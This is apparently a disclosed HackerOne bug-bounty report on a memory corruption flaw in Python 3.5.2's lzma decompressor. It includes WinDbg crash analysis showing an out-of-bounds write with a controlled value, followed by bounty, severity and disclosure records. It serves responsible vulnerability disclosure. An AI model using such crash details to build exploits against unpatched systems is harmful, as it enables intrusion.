VirtAddr         VirtSize)\u003cbr\u003e\n                                    9182d68:          9275000             2000\u003cbr\u003e\n    5c949cd2 verifier!AVrfDebugPageHeapFree+0x000000c2\u003cbr\u003e\n    775be045 ntdll!RtlDebugFreeHeap+0x0000003c\u003cbr\u003e\n    7751cc3e ntdll!RtlpFreeHeap+0x00000c3e\u003cbr\u003e\n    7751b4c8 ntdll!RtlFreeHeap+0x00000268\u003cbr\u003e\n    591067a7 ucrtbased!free_base+0x00000027\u003cbr\u003e\n    5910394b ucrtbased!calloc_base+0x00000b5b\u003cbr\u003e\n    5910617c ucrtbased!free_dbg+0x0000007c\u003cbr\u003e\n    59106750 ucrtbased!free+0x00000010\u003cbr\u003e\n    55e781bd python35_d!_PyMem_RawFree+0x0000000d [c:\\source2\\python-3.5.2\\objects\\obmalloc.c @ 90]\u003cbr\u003e\n    55e77f32 python35_d!_PyMem_DebugFree+0x00000072 [c:\\source2\\python-3.5.2\\objects\\obmalloc.c @ 1892]\u003cbr\u003e\n    55e78434 python35_d!PyMem_RawFree+0x00000014 [c:\\source2\\python-3.5.2\\objects\\obmalloc.c @ 316]\u003cbr\u003e\n    55e77ad1 python35_d!_PyObject_Free+0x00000591 [c:\\source2\\python-3.5.2\\objects\\obmalloc.c @ 1618]\u003cbr\u003e\n    55e77f32 python35_d!_PyMem_DebugFree+0x00000072 [c:\\source2\\python-3.5.2\\objects\\obmalloc.c @ 1892]\u003cbr\u003e\n    55e78724 python35_d!PyObject_Free+0x00000014 [c:\\source2\\python-3.5.2\\objects\\obmalloc.c @ 410]\u003cbr\u003e\n    55e02005 python35_d!bytes_dealloc+0x00000015 [c:\\source2\\python-3.5.2\\objects\\bytesobject.c @ 956]\u003cbr\u003e\n    55e75f73 python35_d!_Py_Dealloc+0x00000023 [c:\\source2\\python-3.5.2\\objects\\object.c @ 1786]\u003cbr\u003e\n    55e922f7 python35_d!tupledealloc+0x000000c7 [c:\\source2\\python-3.5.2\\objects\\tupleobject.c @ 236]\u003cbr\u003e\n    55e75f73 python35_d!_Py_Dealloc+0x00000023 [c:\\source2\\python-3.5.2\\objects\\object.c @ 1786]\u003cbr\u003e\n    55f651a9 python35_d!call_function+0x000003f9 [c:\\source2\\python-3.5.2\\python\\ceval.c @ 4707]\u003cbr\u003e\n    55f6008d python35_d!PyEval_EvalFrameEx+0x0000509d [c:\\source2\\python-3.5.2\\python\\ceval.c @ 3238]\u003cbr\u003e\n    55f6478d python35_d!_PyEval_EvalCodeWithName+0x0000073d [c:\\source2\\python-3.5.2\\python\\ceval.c @ 4018]\u003cbr\u003e\n    55f5afbd python35_d!PyEval_EvalCodeEx+0x0000002d [c:\\source2\\python-3.5.2\\python\\ceval.c @ 4039]\u003cbr\u003e\n    55f5af81 python35_d!PyEval_EvalCode+0x00000021 [c:\\source2\\python-3.5.2\\python\\ceval.c @ 777]\u003cbr\u003e\n    55fe67de python35_d!run_mod+0x0000003e [c:\\source2\\python-3.5.2\\python\\pythonrun.c @ 976]\u003cbr\u003e\n    55fe2daa python35_d!PyRun_FileExFlags+0x0000009a [c:\\source2\\python-3.5.2\\python\\pythonrun.c @ 929]\u003cbr\u003e\n    55fe3dac python35_d!PyRun_SimpleFileExFlags+0x000003ec [c:\\source2\\python-3.5.2\\python\\pythonrun.c @ 396]\u003cbr\u003e\n    55fe2c5b python35_d!PyRun_AnyFileExFlags+0x0000006b [c:\\source2\\python-3.5.2\\python\\pythonrun.c @ 80]\u003cbr\u003e\n    55d39e6d python35_d!run_file+0x0000013d [c:\\source2\\python-3.5.2\\modules\\main.c @ 318]\u003cbr\u003e\n    55d38821 python35_d!Py_Main+0x00000f01 [c:\\source2\\python-3.5.2\\modules\\main.c @ 768]\u003cbr\u003e\n    1c841331 python_d!wmain+0x00000011 [c:\\source2\\python-3.5.2\\programs\\python.c @ 14]\u003cbr\u003e\n    1c84178e python_d!invoke_main+0x0000001e [f:\\dd\\vctools\\crt\\vcstartup\\src\\startup\\exe_common.inl @ 89]\u003cbr\u003e\n    1c8415da python_d!\u003c/u\u003e_scrt_common_main_seh+0x0000015a [f:\\dd\\vctools\\crt\\vcstartup\\src\\startup\\exe_common.inl @ 264]\u003c/p\u003e\n\n\u003cp\u003e0:000\u0026gt; !analyze -v -nodb\u003c/p\u003e\n\n\u003chr\u003e\n\n\u003cul\u003e\n\u003cli\u003e                                                                            *\u003c/li\u003e\n\u003cli\u003e                       Exception Analysis                                   *\u003c/li\u003e\n\u003cli\u003e                                                                            *\n*******************************************************************************\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eFAULTING_IP: \u003cbr\u003e\nVCRUNTIME140D!TrailingDownVec+1f9 [f:\\dd\\vctools\\crt\\vcruntime\\src\\string\\i386\\memcpy.asm @ 658]\u003cbr\u003e\n6bf55149 8917            mov     dword ptr [edi],edx\u003c/p\u003e\n\n\u003cp\u003eEXCEPTION_RECORD:  ffffffff -- (.exr 0xffffffffffffffff)\u003cbr\u003e\nExceptionAddress: 6bf55149 (VCRUNTIME140D!TrailingDownVec+0x000001f9)\u003cbr\u003e\n   ExceptionCode: c0000005 (Access violation)\u003cbr\u003e\n  ExceptionFlags: 00000000\u003cbr\u003e\nNumberParameters: 2\u003cbr\u003e\n   Parameter[0]: 00000001\u003cbr\u003e\n   Parameter[1]: 09275fe8\u003cbr\u003e\nAttempt to write to address 09275fe8\u003c/p\u003e\n\n\u003cp\u003eCONTEXT:  00000000 -- (.cxr 0x0;r)\u003cbr\u003e\neax=0000000a ebx=009ef540 ecx=00000002 edx=41414141 esi=08b44970 edi=09275fe8\u003cbr\u003e\neip=6bf55149 esp=009ef3e0 ebp=009ef434 iopl=0         nv up ei pl nz na po cy\u003cbr\u003e\ncs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010203\u003cbr\u003e\nVCRUNTIME140D!TrailingDownVec+0x1f9:\u003cbr\u003e\n6bf55149 8917            mov     dword ptr [edi],edx  ds:002b:09275fe8=????????\u003c/p\u003e\n\n\u003cp\u003eFAULTING_THREAD:  000043fc\u003c/p\u003e\n\n\u003cp\u003eDEFAULT_BUCKET_ID:  INVALID_POINTER_WRITE\u003c/p\u003e\n\n\u003cp\u003ePROCESS_NAME:  python_d.exe\u003c/p\u003e\n\n\u003cp\u003eERROR_CODE: (NTSTATUS) 0xc0000005 - The instruction at 0x%p referenced memory at 0x%p. The memory could not be %s.\u003c/p\u003e\n\n\u003cp\u003eEXCEPTION_CODE: (NTSTATUS) 0xc0000005 - The instruction at 0x%p referenced memory at 0x%p. The memory could not be %s.\u003c/p\u003e\n\n\u003cp\u003eEXCEPTION_PARAMETER1:  00000001\u003c/p\u003e\n\n\u003cp\u003eEXCEPTION_PARAMETER2:  09275fe8\u003c/p\u003e\n\n\u003cp\u003eWRITE_ADDRESS:  09275fe8 \u003c/p\u003e\n\n\u003cp\u003eFOLLOWUP_IP: \u003cbr\u003e\nVCRUNTIME140D!TrailingDownVec+1f9 [f:\\dd\\vctools\\crt\\vcruntime\\src\\string\\i386\\memcpy.asm @ 658]\u003cbr\u003e\n6bf55149 8917            mov     dword ptr [edi],edx\u003c/p\u003e\n\n\u003cp\u003eNTGLOBALFLAG:  2000000\u003c/p\u003e\n\n\u003cp\u003eAPPLICATION_VERIFIER_FLAGS:  0\u003c/p\u003e\n\n\u003cp\u003eAPP:  python_d.exe\u003c/p\u003e\n\n\u003cp\u003eANALYSIS_VERSION: 6.3.9600.17029 (debuggers(dbg).140219-1702) x86fre\u003c/p\u003e\n\n\u003cp\u003ePRIMARY_PROBLEM_CLASS:  INVALID_POINTER_WRITE\u003c/p\u003e\n\n\u003cp\u003eBUGCHECK_STR:  APPLICATION_FAULT_INVALID_POINTER_WRITE_INVALID_POINTER_READ\u003c/p\u003e\n\n\u003cp\u003eLAST_CONTROL_TRANSFER:  from 5d573f80 to 6bf55149\u003c/p\u003e\n\n\u003cp\u003eSTACK_TEXT:\u003cbr\u003e\u003cbr\u003e\n009ef3e4 5d573f80 09275fe8 08b44970 0000000a VCRUNTIME140D!TrailingDownVec+0x1f9\u003cbr\u003e\n009ef434 5d573383 060e9f40 08b44970 0000000a \u003cu\u003elzma_d!decompress+0x130\u003cbr\u003e\n009ef454 5d572049 060e9f40 009ef468 ffffffff _lzma_d!_lzma_LZMADecompressor_decompress_impl+0x93\u003cbr\u003e\n009ef49c 55e6dd40 060e9f40 079cec40 00000000 _lzma_d!_lzma_LZMADecompressor_decompress+0x79\u003cbr\u003e\n009ef4d4 55f65199 08b53db8 079cec40 00000000 python35_d!PyCFunction_Call+0x80\u003cbr\u003e\n009ef4fc 55f6008d 009ef540 079cec40 06143c78 python35_d!call_function+0x3e9\u003cbr\u003e\n009ef58c 55f6478d 06143c78 00000000 1c84114f python35_d!PyEval_EvalFrameEx+0x509d\u003cbr\u003e\n009ef5cc 55f5afbd 079eae60 06143c78 06171978 python35_d!_PyEval_EvalCodeWithName+0x73d\u003cbr\u003e\n009ef608 55f5af81 079eae60 06171978 06171978 python35_d!PyEval_EvalCodeEx+0x2d\u003cbr\u003e\n009ef63c 55fe67de 079eae60 06171978 06171978 python35_d!PyEval_EvalCode+0x21\u003cbr\u003e\n009ef660 55fe2daa 08db1470 08b4b168 06171978 python35_d!run_mod+0x3e\u003cbr\u003e\n009ef69c 55fe3dac 06e40fc0 079f30e0 00000101 python35_d!PyRun_FileExFlags+0x9a\u003cbr\u003e\n009ef730 55fe2c5b 06e40fc0 079f30e0 00000001 python35_d!PyRun_SimpleFileExFlags+0x3ec\u003cbr\u003e\n009ef74c 55d39e6d 06e40fc0 079f30e0 00000001 python35_d!PyRun_AnyFileExFlags+0x6b\u003cbr\u003e\n009ef7a0 55d38821 06e40fc0 06012fa6 009ef85c python35_d!run_file+0x13d\u003cbr\u003e\n009ef908 1c841331 00000002 06012f80 009ef92c python35_d!Py_Main+0xf01\u003cbr\u003e\n009ef918 1c84178e 00000002 06012f80 0601af40 python_d!wmain+0x11\u003cbr\u003e\n009ef92c 1c8415da 851961c5 1c84114f 1c84114f python_d!invoke_main+0x1e\u003cbr\u003e\n009ef984 1c84146d 009ef994 1c8417a8 009ef9a8 python_d!\u003c/u\u003e\u003cu\u003escrt_common_main_seh+0x15a\u003cbr\u003e\n009ef98c 1c8417a8 009ef9a8 742438f4 006cd000 python_d!\u003c/u\u003e\u003cu\u003escrt_common_main+0xd\u003cbr\u003e\n009ef994 742438f4 006cd000 742438d0 939c497b python_d!wmainCRTStartup+0x8\u003cbr\u003e\n009ef9a8 77545de3 006cd000 5080bb84 00000000 KERNEL32!BaseThreadInitThunk+0x24\u003cbr\u003e\n009ef9f0 77545dae ffffffff 7756b7d7 00000000 ntdll!\u003c/u\u003e_RtlUserThreadStart+0x2f\u003cbr\u003e\n009efa00 00000000 1c84114f 006cd000 00000000 ntdll!_RtlUserThreadStart+0x1b\u003c/p\u003e\n\n\u003cp\u003eSTACK_COMMAND:  .cxr 0x0 ; kb\u003c/p\u003e\n\n\u003cp\u003eFAULTING_SOURCE_LINE:  f:\\dd\\vctools\\crt\\vcruntime\\src\\string\\i386\\memcpy.asm\u003c/p\u003e\n\n\u003cp\u003eFAULTING_SOURCE_FILE:  f:\\dd\\vctools\\crt\\vcruntime\\src\\string\\i386\\memcpy.asm\u003c/p\u003e\n\n\u003cp\u003eFAULTING_SOURCE_LINE_NUMBER:  658\u003c/p\u003e\n\n\u003cp\u003eSYMBOL_STACK_INDEX:  0\u003c/p\u003e\n\n\u003cp\u003eSYMBOL_NAME:  vcruntime140d!TrailingDownVec+1f9\u003c/p\u003e\n\n\u003cp\u003eFOLLOWUP_NAME:  MachineOwner\u003c/p\u003e\n\n\u003cp\u003eMODULE_NAME: VCRUNTIME140D\u003c/p\u003e\n\n\u003cp\u003eIMAGE_NAME:  VCRUNTIME140D.dll\u003c/p\u003e\n\n\u003cp\u003eDEBUG_FLR_IMAGE_TIMESTAMP:  558ce3d5\u003c/p\u003e\n\n\u003cp\u003eFAILURE_BUCKET_ID:  INVALID_POINTER_WRITE_c0000005_VCRUNTIME140D.dll!TrailingDownVec\u003c/p\u003e\n\n\u003cp\u003eBUCKET_ID:  APPLICATION_FAULT_INVALID_POINTER_WRITE_INVALID_POINTER_READ_vcruntime140d!TrailingDownVec+1f9\u003c/p\u003e\n\n\u003cp\u003eANALYSIS_SOURCE:  UM\u003c/p\u003e\n\n\u003cp\u003eFAILURE_ID_HASH_STRING:  um:invalid_pointer_write_c0000005_vcruntime140d.dll!trailingdownvec\u003c/p\u003e\n\n\u003cp\u003eFAILURE_ID_HASH:  {935a9c66-b210-2678-8c10-c746a999bfb6}\u003c/p\u003e\n\n\u003ch2 id=\"followup-machineowner\"\u003eFollowup: MachineOwner\u003c/h2\u003e\n","bounty_amount":"1500.0","formatted_bounty":"$1,500","weakness":{"id":2,"name":"Memory Corruption - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2017-01-03T06:09:28.305Z","allow_singular_disclosure_after":-125793112.74571148,"singular_disclosure_allowed":true,"vote_count":15,"voters":["madrobot","mpz","hussein98d","exception","satishpk1","paulos_","japz","sumit7","spetr0x","martijn","and 5 more..."],"severity":{"rating":"critical","author_type":"User"},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":1223268,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"The bug was closed when I submitted this, but has since been re-activated as a similar issue has been identified in the BZ2 module.","markdown_message":"\u003cp\u003eThe bug was closed when I submitted this, but has since been re-activated as a similar issue has been identified in the BZ2 module.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-09-29T09:59:27.137Z","updated_at":"2016-09-29T09:59:27.137Z","actor":{"username":"johnleitch","cleared":false,"url":"/johnleitch","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"ibb-python","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1227170,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"The BZ2 module is now fixed and the issue is resolved proper.","markdown_message":"\u003cp\u003eThe BZ2 module is now fixed and the issue is resolved proper.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-10-01T04:32:18.752Z","updated_at":"2016-10-01T04:32:18.752Z","actor":{"username":"johnleitch","cleared":false,"url":"/johnleitch","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"ibb-python","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1241673,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2016-10-11T08:10:42.795Z","updated_at":"2016-10-11T08:10:42.795Z","additional_data":{"old_severity":null,"new_severity":"Critical","old_severity_id":null,"new_severity_id":1472},"actor":{"username":"johnleitch","cleared":false,"url":"/johnleitch","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"ibb-python","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1338918,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","markdown_message":"","automated_response":false,"created_at":"2016-12-03T19:39:41.959Z","updated_at":"2016-12-03T19:39:41.959Z","actor":{"username":"arice","cleared":false,"url":"/arice","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/020/83152cb2d070f3f6a63c1b61bae47257722b5ad2_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"reporter":{"username":"johnleitch","url":"/johnleitch"},"genius_execution_id":null,"team_handle":"ibb-python","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1338919,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","markdown_message":"","automated_response":false,"created_at":"2016-12-03T19:39:50.214Z","updated_at":"2016-12-03T19:39:50.214Z","actor":{"url":"/ibb-python","ibb":true,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/027/c46b79d4c73a7b34d61a717ed19ae719a0b67b2e_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Python (IBB)"}},"bounty_amount":"1500.0","bounty_currency":"usd","genius_execution_id":null,"team_handle":"ibb-python","collaborator":{"username":"johnleitch","url":"/johnleitch"},"actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1339462,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2016-12-04T06:09:28.288Z","updated_at":"2016-12-04T06:09:28.288Z","first_to_agree":true,"actor":{"username":"johnleitch","cleared":false,"url":"/johnleitch","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"ibb-python","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1340402,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2016-12-05T00:30:49.314Z","updated_at":"2016-12-05T00:30:49.314Z","actor":{"username":"arice","cleared":false,"url":"/arice","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/020/83152cb2d070f3f6a63c1b61bae47257722b5ad2_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"ibb-python","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1340403,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2016-12-05T00:30:49.371Z","updated_at":"2016-12-05T00:30:49.371Z","actor":{"username":"arice","cleared":false,"url":"/arice","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/020/83152cb2d070f3f6a63c1b61bae47257722b5ad2_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"ibb-python","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}